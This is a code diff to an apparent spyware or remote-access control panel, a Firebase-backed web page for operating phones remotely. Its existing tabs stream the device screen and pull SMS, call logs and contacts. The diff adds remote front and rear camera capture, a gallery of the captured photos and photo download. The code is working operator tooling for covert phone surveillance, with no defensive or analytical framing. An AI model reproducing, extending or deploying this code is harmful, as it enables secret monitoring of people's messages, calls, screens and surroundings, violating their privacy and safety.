@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Device Control Panel</title>
+    <title>Advanced Device Control Panel with Camera</title>
     
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
@@ -230,6 +230,7 @@
         .command-card:active { transform: scale(0.95); }
         .command-card.no-device { cursor: not-allowed; opacity: 0.6; }
         .command-card.no-device:hover { transform: none; border-color: transparent; }
+        .command-card.camera-card { background: linear-gradient(135deg, #667eea15, #764ba215); }
 
         .command-icon { font-size: 2em; margin-bottom: 8px; }
         .command-label { font-weight: 600; font-size: 0.85em; color: var(--dark); }
@@ -596,12 +597,87 @@
             border: 1px solid #e5e7eb;
         }
 
+        /* Camera Gallery Styles */
+        .photo-gallery {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 15px;
+            margin: 15px 0;
+        }
+
+        .photo-card {
+            background: white;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            transition: transform 0.3s ease;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .photo-card:hover {
+            transform: scale(1.05);
+            box-shadow: 0 8px 25px rgba(0,0,0,0.2);
+        }
+
+        .photo-card img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+        }
+
+        .photo-info {
+            padding: 10px;
+            font-size: 0.8em;
+            color: var(--gray);
+        }
+
+        .photo-badge {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.7);
+            color: white;
+            padding: 3px 10px;
+            border-radius: 12px;
+            font-size: 0.7em;
+            font-weight: 600;
+        }
+
+        .camera-selector {
+            display: flex;
+            gap: 10px;
+            margin: 15px 0;
+            flex-wrap: wrap;
+        }
+
+        .camera-btn {
+            padding: 10px 20px;
+            border: 2px solid var(--primary);
+            background: white;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+
+        .camera-btn:hover {
+            background: var(--primary);
+            color: white;
+        }
+
+        .camera-btn.active {
+            background: var(--primary);
+            color: white;
+        }
+
         @media (max-width: 768px) {
             body { padding: 10px; }
             .header h1 { font-size: 1.8em; }
             .device-grid { grid-template-columns: 1fr; }
             .command-grid { grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); }
             .data-table { font-size: 0.8em; }
+            .photo-gallery { grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); }
         }
     </style>
 </head>
@@ -612,8 +688,8 @@
     <div class="container">
         <!-- Header -->
         <div class="header">
-            <h1>📱 Advanced Device Control</h1>
-            <p>Real-time Remote Management System with Live Screen Sharing</p>
+            <h1>📱 Advanced Device Control Panel</h1>
+            <p>Real-time Remote Management with Camera Capture & Live Screen Sharing</p>
             <div class="stats-bar">
                 <div class="stat-item">
                     <span class="stat-dot online"></span>
@@ -662,6 +738,7 @@
             <!-- Tabs -->
             <div class="tabs">
                 <button class="tab-btn active" onclick="switchTab('screen')">📺 Live Screen</button>
+                <button class="tab-btn" onclick="switchTab('camera')">📷 Camera</button>
                 <button class="tab-btn" onclick="switchTab('sms')">💬 SMS</button>
                 <button class="tab-btn" onclick="switchTab('calls')">📞 Call Log</button>
                 <button class="tab-btn" onclick="switchTab('commands')">🎮 Commands</button>
@@ -717,6 +794,63 @@
                 </div>
             </div>
 
+            <!-- Camera Tab -->
+            <div class="tab-content" id="tab-camera">
+                <div class="section-title">
+                    <div class="section-title-left">
+                        <span>📷</span> Camera Capture & Gallery
+                    </div>
+                    <div style="display: flex; gap: 10px;">
+                        <button class="delete-all-btn" onclick="clearCameraPhotos()">
+                            <i class="fas fa-trash"></i> Clear All Photos
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Camera Quick Capture Buttons -->
+                <div class="camera-selector">
+                    <button class="camera-btn active" onclick="quickCapture('back')">
+                        <i class="fas fa-camera"></i> Rear Camera
+                    </button>
+                    <button class="camera-btn" onclick="quickCapture('front')">
+                        <i class="fas fa-camera-rotate"></i> Front Camera
+                    </button>
+                    <button class="camera-btn" onclick="quickCapture('both')">
+                        <i class="fas fa-images"></i> Both Cameras
+                    </button>
+                </div>
+
+                <div class="command-grid">
+                    <div class="command-card camera-card" onclick="sendCommand('take_photo', {camera: 'back'})">
+                        <div class="command-icon">📷</div>
+                        <div class="command-label">Rear Camera Photo</div>
+                    </div>
+                    <div class="command-card camera-card" onclick="sendCommand('take_photo', {camera: 'front'})">
+                        <div class="command-icon">🤳</div>
+                        <div class="command-label">Front Camera Photo</div>
+                    </div>
+                    <div class="command-card camera-card" onclick="sendCommand('take_photo', {camera: 'both'})">
+                        <div class="command-icon">📸</div>
+                        <div class="command-label">Both Cameras</div>
+                    </div>
+                </div>
+
+                <!-- Photo Gallery -->
+                <div class="section-title">
+                    <div class="section-title-left">
+                        <span>🖼️</span> Photo Gallery
+                        <span style="font-size: 0.8em; color: var(--gray);" id="photoCount">0 photos</span>
+                    </div>
+                </div>
+                <div class="photo-gallery" id="photoGallery">
+                    <div class="no-data" style="grid-column: 1/-1;">
+                        <i class="fas fa-camera-retro"></i>
+                        <p>No photos captured yet</p>
+                        <p style="font-size: 0.8em;">Use the camera buttons above to capture photos</p>
+                    </div>
+                </div>
+            </div>
+
             <!-- SMS Tab -->
             <div class="tab-content" id="tab-sms">
                 <div class="section-title">
@@ -760,6 +894,34 @@
                         <span>🎮</span> Device Commands
                     </div>
                 </div>
+                
+                <!-- Camera Section in Commands -->
+                <div class="section-title" style="margin-top: 5px;">
+                    <div class="section-title-left">
+                        <span>📷</span> Camera Controls
+                    </div>
+                </div>
+                <div class="command-grid">
+                    <div class="command-card camera-card" onclick="sendCommand('take_photo', {camera: 'back'})">
+                        <div class="command-icon">📷</div>
+                        <div class="command-label">Rear Camera</div>
+                    </div>
+                    <div class="command-card camera-card" onclick="sendCommand('take_photo', {camera: 'front'})">
+                        <div class="command-icon">🤳</div>
+                        <div class="command-label">Front Camera</div>
+                    </div>
+                    <div class="command-card camera-card" onclick="sendCommand('take_photo', {camera: 'both'})">
+                        <div class="command-icon">📸</div>
+                        <div class="command-label">Both Cameras</div>
+                    </div>
+                </div>
+
+                <!-- Other Commands -->
+                <div class="section-title" style="margin-top: 5px;">
+                    <div class="section-title-left">
+                        <span>🎯</span> All Commands
+                    </div>
+                </div>
                 <div class="command-grid">
                     <div class="command-card" onclick="sendCommand('screenshot')">
                         <div class="command-icon">📸</div>
@@ -800,10 +962,6 @@
                     <div class="command-card" onclick="sendCommand('toggle_flashlight')">
                         <div class="command-icon">🔦</div>
                         <div class="command-label">Flashlight</div>
-                    </div>
-                    <div class="command-card" onclick="sendCommand('take_photo')">
-                        <div class="command-icon">📷</div>
-                        <div class="command-label">Take Photo</div>
                     </div>
                 </div>
             </div>
@@ -852,12 +1010,16 @@
         let streamListener = null;
         let responseListener = null;
         let screenshotListener = null;
+        let photosListener = null;
         
         // Stream variables
         let streamActive = false;
         let streamFrameCount = 0;
         let lastFrameTime = Date.now();
         let frameTimes = [];
+        
+        // Camera photos array
+        let capturedPhotos = [];
 
         const deviceGrid = document.getElementById('deviceGrid');
         const controlPanel = document.getElementById('controlPanel');
@@ -867,6 +1029,8 @@
         const screenContainer = document.getElementById('screenContainer');
         const smsContainer = document.getElementById('smsContainer');
         const callLogContainer = document.getElementById('callLogContainer');
+        const photoGallery = document.getElementById('photoGallery');
+        const photoCount = document.getElementById('photoCount');
         const onlineCount = document.getElementById('onlineCount');
         const connectedCount = document.getElementById('connectedCount');
         const commandCountEl = document.getElementById('commandCount');
@@ -912,7 +1076,7 @@
             const container = document.getElementById('toastContainer');
             const toast = document.createElement('div');
             toast.className = 'toast';
-            const icons = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️' };
+            const icons = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️', camera: '📷' };
             toast.innerHTML = `<span>${icons[type] || icons.info}</span> ${message}`;
             container.appendChild(toast);
             setTimeout(() => {
@@ -968,6 +1132,18 @@
             });
         }
 
+        function clearCameraPhotos() {
+            showModal('Clear Photos', 'Delete all captured photos? This cannot be undone.', () => {
+                capturedPhotos = [];
+                renderPhotoGallery();
+                if (connectedDeviceId) {
+                    database.ref(`devices/${connectedDeviceId}/photos`).remove();
+                }
+                addLog('📷 All photos cleared', 'info');
+                showToast('Photo gallery cleared', 'success');
+            });
+        }
+
         // ============ STATS ============
         function updateStats() {
             const deviceList = Object.values(devices).filter(d => d && d.deviceName);
@@ -975,7 +1151,6 @@
             connectedCount.textContent = deviceList.filter(d => d.connectionStatus === 'connected').length;
             commandCountEl.textContent = commandCount;
             
-            // Update stream status
             if (streamActive) {
                 streamStatus.style.display = 'flex';
             } else {
@@ -997,9 +1172,108 @@
             return `${mins}m ${remainingSecs}s`;
         }
 
+        function timeAgo(timestamp) {
+            const now = Date.now();
+            const diff = now - timestamp;
+            const seconds = Math.floor(diff / 1000);
+            const minutes = Math.floor(seconds / 60);
+            const hours = Math.floor(minutes / 60);
+            const days = Math.floor(hours / 24);
+            
+            if (days > 0) return `${days}d ago`;
+            if (hours > 0) return `${hours}h ago`;
+            if (minutes > 0) return `${minutes}m ago`;
+            return `${seconds}s ago`;
+        }
+
+        // ============ CAMERA FUNCTIONS ============
+        function quickCapture(cameraType) {
+            if (!connectedDeviceId) {
+                showToast('Connect to a device first!', 'warning');
+                addLog('⚠️ No device connected', 'warning');
+                return;
+            }
+
+            // Update active button
+            document.querySelectorAll('.camera-btn').forEach(btn => btn.classList.remove('active'));
+            event.target.closest('.camera-btn').classList.add('active');
+
+            if (cameraType === 'both') {
+                showToast('Capturing from both cameras...', 'camera');
+                addLog('📸 Capturing from both cameras', 'info');
+            } else {
+                showToast(`Capturing from ${cameraType} camera...`, 'camera');
+                addLog(`📷 Capturing from ${cameraType} camera`, 'info');
+            }
+
+            sendCommand('take_photo', { camera: cameraType });
+        }
+
+        function renderPhotoGallery() {
+            if (capturedPhotos.length === 0) {
+                photoGallery.innerHTML = `
+                    <div class="no-data" style="grid-column: 1/-1;">
+                        <i class="fas fa-camera-retro"></i>
+                        <p>No photos captured yet</p>
+                        <p style="font-size: 0.8em;">Use the camera buttons above to capture photos</p>
+                    </div>`;
+                photoCount.textContent = '0 photos';
+                return;
+            }
+
+            photoCount.textContent = `${capturedPhotos.length} photo${capturedPhotos.length > 1 ? 's' : ''}`;
+            
+            let html = '';
+            capturedPhotos.slice().reverse().forEach((photo, index) => {
+                const cameraIcon = photo.camera === 'front' ? '🤳' : '📷';
+                const cameraLabel = photo.camera === 'front' ? 'Front' : 'Rear';
+                html += `
+                <div class="photo-card" onclick="viewPhoto('${photo.image}', '${photo.width}x${photo.height}', '${cameraLabel} Camera')">
+                    <span class="photo-badge">${cameraIcon} ${cameraLabel}</span>
+                    <img src="${photo.image}" alt="${cameraLabel} Camera Photo" loading="lazy">
+                    <div class="photo-info">
+                        <div><strong>${photo.width}x${photo.height}</strong></div>
+                        <div>${timeAgo(photo.timestamp)}</div>
+                        <div style="font-size: 0.7em; color: #9ca3af;">${formatDate(photo.timestamp)}</div>
+                    </div>
+                </div>`;
+            });
+            
+            photoGallery.innerHTML = html;
+        }
+
+        function viewPhoto(imageUrl, dimensions, cameraType) {
+            const overlay = document.getElementById('modalOverlay');
+            overlay.innerHTML = `
+                <div class="modal" style="max-width: 90vw; max-height: 90vh; overflow: auto;">
+                    <h3>📷 ${cameraType} - ${dimensions}</h3>
+                    <img src="${imageUrl}" style="max-width: 100%; max-height: 70vh; border-radius: 12px; margin: 15px 0;">
+                    <div style="display: flex; gap: 10px; justify-content: center;">
+                        <button class="btn btn-connect" onclick="downloadPhoto('${imageUrl}')">
+                            <i class="fas fa-download"></i> Download
+                        </button>
+                        <button class="btn btn-disconnect" onclick="document.getElementById('modalOverlay').style.display='none'">
+                            <i class="fas fa-times"></i> Close
+                        </button>
+                    </div>
+                </div>
+            `;
+            overlay.style.display = 'flex';
+        }
+
+        function downloadPhoto(imageUrl) {
+            const link = document.createElement('a');
+            link.href = imageUrl;
+            link.download = `camera_photo_${Date.now()}.jpg`;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            showToast('Photo download started', 'success');
+            addLog('📥 Photo downloaded', 'success');
+        }
+
         // ============ STREAM FUNCTIONS ============
         function updateStreamQuality() {
-            // Quality will be applied on next stream start
             const quality = document.getElementById('streamQuality').value;
             addLog(`🎚️ Stream quality set to: ${quality}%`, 'info');
             showToast(`Stream quality: ${quality}%`, 'info');
@@ -1008,12 +1282,8 @@
         function calculateFPS() {
             const now = Date.now();
             frameTimes.push(now);
-            
-            // Keep only last 2 seconds of frames
             frameTimes = frameTimes.filter(time => now - time < 2000);
-            
             if (frameTimes.length < 2) return '...';
-            
             const fps = Math.round((frameTimes.length / 2) * 10) / 10;
             return fps;
         }
@@ -1034,24 +1304,7 @@
             showToast('Starting live stream...', 'info');
             addLog('📹 Requesting live stream...', 'info');
             
-            // Send start_streaming command
-            const commandId = database.ref(`devices/${connectedDeviceId}/commands`).push().key;
-            
-            database.ref(`devices/${connectedDeviceId}/commands/${commandId}`).set({
-                id: commandId,
-                type: 'start_streaming',
-                timestamp: Date.now(),
-                params: {
-                    quality: document.getElementById('streamQuality').value || 50
-                }
-            }).then(() => {
-                commandCount++;
-                updateStats();
-                addLog('📤 Stream start command sent', 'success');
-            }).catch((error) => {
-                addLog(`❌ Failed to start stream: ${error.message}`, 'error');
-                showToast('Failed to start stream', 'error');
-            });
+            sendCommand('start_streaming', { quality: document.getElementById('streamQuality').value || 50 });
         }
 
         function stopLiveStream() {
@@ -1065,25 +1318,8 @@
             showToast('Stopping stream...', 'info');
             addLog('⏹️ Stopping live stream...', 'info');
             
-            // Send stop_streaming command
-            const commandId = database.ref(`devices/${connectedDeviceId}/commands`).push().key;
-            
-            database.ref(`devices/${connectedDeviceId}/commands/${commandId}`).set({
-                id: commandId,
-                type: 'stop_streaming',
-                timestamp: Date.now(),
-                params: {}
-            }).then(() => {
-                commandCount++;
-                updateStats();
-                addLog('📤 Stream stop command sent', 'success');
-                
-                // Clean up stream locally
-                cleanupStream();
-            }).catch((error) => {
-                addLog(`❌ Failed to stop stream: ${error.message}`, 'error');
-                showToast('Failed to stop stream', 'error');
-            });
+            sendCommand('stop_streaming', {});
+            cleanupStream();
         }
 
         function cleanupStream() {
@@ -1167,9 +1403,11 @@
             showToast(`SMS loaded: ${messages.length} messages`, 'success');
         }
 
-        function displayScreenshot(imageUrl, deviceName, width, height) {
+        function displayScreenshot(imageUrl, deviceName, width, height, cameraType) {
+            const badge = cameraType ? `<span style="background: rgba(102,126,234,0.9); color: white; padding: 3px 10px; border-radius: 12px; font-size: 0.8em; margin-left: 8px;">${cameraType === 'front' ? '🤳 Front' : '📷 Rear'} Camera</span>` : '';
+            
             screenContainer.innerHTML = `
-                <div class="screen-info">📱 ${deviceName} | ${width}x${height} | ${new Date().toLocaleTimeString()}</div>
+                <div class="screen-info">📱 ${deviceName} ${badge} | ${width}x${height} | ${new Date().toLocaleTimeString()}</div>
                 <button class="screen-delete-btn" onclick="clearScreen()">
                     <i class="fas fa-times"></i> Delete
                 </button>
@@ -1204,6 +1442,7 @@
                         setupResponseListener(deviceId);
                         setupStreamListener(deviceId);
                         setupScreenshotListener(deviceId);
+                        setupPhotosListener(deviceId);
                     }
                 } else if (device.connectionStatus === 'available' && connectedDeviceId === deviceId) {
                     handleDisconnection(device);
@@ -1230,7 +1469,6 @@
             addLog(`🔌 Disconnected from ${deviceName}`, 'warning');
             showToast(`Disconnected from ${deviceName}`, 'warning');
 
-            // Clean up stream
             if (streamActive) {
                 cleanupStream();
             }
@@ -1243,9 +1481,15 @@
                 database.ref(`devices/${connectedDeviceId}/screenshots`).off('child_added', screenshotListener);
                 screenshotListener = null;
             }
+            if (photosListener) {
+                database.ref(`devices/${connectedDeviceId}/photos`).off('child_added', photosListener);
+                photosListener = null;
+            }
 
             connectedDeviceId = null;
             controlPanel.style.display = 'none';
+            capturedPhotos = [];
+            renderPhotoGallery();
         }
 
         function setupScreenshotListener(deviceId) {
@@ -1258,13 +1502,43 @@
                 .limitToLast(1)
                 .on('child_added', (snapshot) => {
                     const screenshot = snapshot.val();
-                    if (screenshot && screenshot.image) {
+                    if (screenshot && screenshot.image && !screenshot.camera) {
                         displayScreenshot(
                             screenshot.image, 
                             screenshot.deviceName || 'Unknown', 
                             screenshot.width, 
                             screenshot.height
                         );
+                    }
+                });
+        }
+
+        function setupPhotosListener(deviceId) {
+            if (photosListener) {
+                database.ref(`devices/${connectedDeviceId}/photos`).off('child_added', photosListener);
+            }
+
+            capturedPhotos = [];
+            
+            photosListener = database.ref(`devices/${deviceId}/photos`)
+                .orderByChild('timestamp')
+                .on('child_added', (snapshot) => {
+                    const photo = snapshot.val();
+                    if (photo && photo.image) {
+                        capturedPhotos.push(photo);
+                        renderPhotoGallery();
+                        
+                        // Also display latest photo in screen tab
+                        displayScreenshot(
+                            photo.image,
+                            photo.deviceName || 'Unknown',
+                            photo.width,
+                            photo.height,
+                            photo.camera
+                        );
+                        
+                        addLog(`📷 New photo from ${photo.camera} camera (${photo.width}x${photo.height})`, 'success');
+                        showToast(`New ${photo.camera} camera photo received!`, 'camera');
                     }
                 });
         }
@@ -1293,6 +1567,26 @@
                         }
                         break;
 
+                    case 'take_photo_response':
+                        if (response.data?.base64) {
+                            const deviceName = response.data.deviceName || 'Unknown';
+                            const cameraType = response.data.camera || 'unknown';
+                            
+                            // Display in screen tab
+                            displayScreenshot(
+                                `data:image/jpeg;base64,${response.data.base64}`,
+                                deviceName,
+                                response.data.width,
+                                response.data.height,
+                                cameraType
+                            );
+                            
+                            addLog(`📷 Photo captured from ${cameraType} camera`, 'success');
+                            showToast(`Photo captured from ${cameraType} camera!`, 'camera');
+                            switchTab('camera');
+                        }
+                        break;
+
                     case 'streaming_response':
                         if (response.data) {
                             if (response.data.status === 'started') {
@@ -1301,7 +1595,7 @@
                                 frameTimes = [];
                                 streamingBadge.style.display = 'inline-flex';
                                 streamStatus.style.display = 'flex';
-                                addLog(`📹 Live stream started - Quality: ${response.data.quality || 'N/A'}%, Interval: ${response.data.interval || 'N/A'}ms`, 'success');
+                                addLog(`📹 Live stream started`, 'success');
                                 showToast('Live stream started!', 'success');
                                 switchTab('screen');
                             } else if (response.data.status === 'stopped') {
@@ -1538,7 +1832,6 @@
             
             addLog(`🔌 Disconnecting from ${deviceName}...`, 'info');
 
-            // Stop stream if active
             if (streamActive) {
                 cleanupStream();
                 database.ref(`devices/${connectedDeviceId}/screenStream`).remove();
@@ -1557,8 +1850,14 @@
                     database.ref(`devices/${connectedDeviceId}/screenshots`).off('child_added', screenshotListener);
                     screenshotListener = null;
                 }
+                if (photosListener) {
+                    database.ref(`devices/${connectedDeviceId}/photos`).off('child_added', photosListener);
+                    photosListener = null;
+                }
                 connectedDeviceId = null;
                 controlPanel.style.display = 'none';
+                capturedPhotos = [];
+                renderPhotoGallery();
                 addLog('✅ Disconnected successfully', 'success');
                 showToast('Disconnected', 'success');
             }).catch((error) => {
@@ -1568,7 +1867,7 @@
         }
 
         // ============ SEND COMMAND ============
-        function sendCommand(commandType) {
+        function sendCommand(commandType, params = {}) {
             if (!connectedDeviceId) {
                 showToast('Connect to a device first!', 'warning');
                 addLog('⚠️ No device connected', 'warning');
@@ -1583,11 +1882,38 @@
 
             const commandId = database.ref(`devices/${connectedDeviceId}/commands`).push().key;
             
+            // Handle both cameras
+            if (commandType === 'take_photo' && params.camera === 'both') {
+                // Send front camera command
+                database.ref(`devices/${connectedDeviceId}/commands/${commandId}_front`).set({
+                    id: commandId + '_front',
+                    type: 'take_photo',
+                    timestamp: Date.now(),
+                    params: { camera: 'front' }
+                });
+                
+                // Send back camera command with slight delay
+                setTimeout(() => {
+                    database.ref(`devices/${connectedDeviceId}/commands/${commandId}_back`).set({
+                        id: commandId + '_back',
+                        type: 'take_photo',
+                        timestamp: Date.now(),
+                        params: { camera: 'back' }
+                    });
+                }, 1000);
+                
+                commandCount += 2;
+                updateStats();
+                addLog('📸 Both camera capture commands sent', 'info');
+                showToast('Capturing from both cameras...', 'camera');
+                return;
+            }
+            
             database.ref(`devices/${connectedDeviceId}/commands/${commandId}`).set({
                 id: commandId,
                 type: commandType,
                 timestamp: Date.now(),
-                params: {}
+                params: params
             }).then(() => {
                 commandCount++;
                 updateStats();
@@ -1602,7 +1928,7 @@
                     'get_contacts': 'Contacts',
                     'get_device_info': 'Device Info',
                     'toggle_flashlight': 'Flashlight',
-                    'take_photo': 'Take Photo'
+                    'take_photo': `Take Photo (${params.camera || 'back'})`
                 };
                 const cmdName = cmdNames[commandType] || commandType;
                 addLog(`📤 Command sent: ${cmdName}`, 'info');
@@ -1626,7 +1952,6 @@
         // ============ PAGE UNLOAD ============
         window.addEventListener('beforeunload', () => {
             if (connectedDeviceId) {
-                // Stop stream before disconnecting
                 if (streamActive) {
                     database.ref(`devices/${connectedDeviceId}/commands`).push().set({
                         type: 'stop_streaming',
@@ -1648,8 +1973,9 @@
         // ============ INIT ============
         function init() {
             setupListeners();
-            addLog('🟢 Control Panel Started', 'success');
+            addLog('🟢 Control Panel Started with Camera Support', 'success');
             addLog(`🆔 Client ID: ${myClientId}`, 'info');
+            addLog('📷 Camera capture ready - Front & Rear support', 'info');
             addLog('📹 Live screen sharing ready', 'info');
             setInterval(() => {
                 if (document.visibilityState === 'visible') updateStats();
